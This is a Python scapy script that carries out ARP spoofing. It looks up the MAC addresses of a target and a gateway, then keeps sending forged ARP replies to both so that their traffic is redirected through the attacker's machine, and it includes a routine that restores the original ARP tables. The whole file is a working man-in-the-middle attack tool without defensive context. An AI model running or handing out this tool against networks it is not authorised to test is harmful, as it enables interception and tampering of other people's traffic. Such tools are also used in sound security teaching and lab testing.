from scapy.all import *
import sys
import time

def mac(ip):
    ether = Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst = ip)

    packet = ether/arp

    answer = srp(packet, timeout = 3, verbose = 0)

    try:
        return answer[0][0][1].src
    except:
        return False


def spoof(target_ip, getawey_ip, target_mac, getawey_mac):

    ArpPacket = ARP(pdst = target_ip, hwdst = target_mac, psrc = getawey_ip, op = "is-at")

    send(ArpPacket, verbose = 0)

    my_mac = Ether().src

    now = time.localtime()
    print(u"\u001b[0m[" + str(now.tm_hour) + ":" + str(now.tm_min) + ":" + str(now.tm_sec) + "]" + " Arp Spoof {0} : {1} is-at {2}".format(target_mac, getawey_mac, my_mac))
    time.sleep(0.5)


def comin(target_ip, getawey_ip, target_mac, getawey_mac):

    ArpPacket = ARP(pdst = target_ip, hwdst = target_mac, psrc = getawey_ip, hwsrc = getawey_mac, op = "is-at")

    send(ArpPacket, verbose = 0)

    my_mac = Ether().src

    now = time.localtime()
    print(u"\u001b[34m[" + str(now.tm_hour) + ":" + str(now.tm_min) + ":" + str(now.tm_sec) + "]" + " Restoring {0} : {1} is-at {2}".format(target_mac, getawey_mac, getawey_mac))
    time.sleep(0.5)


def start(target_ip, getawey_ip):
    for j in range(3):
        target_mac = mac(target_ip)
        getawey_mac = mac(getawey_ip)
        if target_mac and getawey_mac:
            break
        time.sleep(3)

    while True:
        spoof(target_ip, getawey_ip, target_mac, getawey_mac)
        spoof(getawey_ip, target_ip, getawey_mac, target_mac)



def stop(target_ip, getawey_ip):
    for j in range(3):
        target_mac = mac(target_ip)
        getawey_mac = mac(getawey_ip)
        if target_mac and getawey_mac:
            break
        time.sleep(3)

    for i in range(0, 15):
        comin(target_ip, getawey_ip, target_mac, getawey_mac)
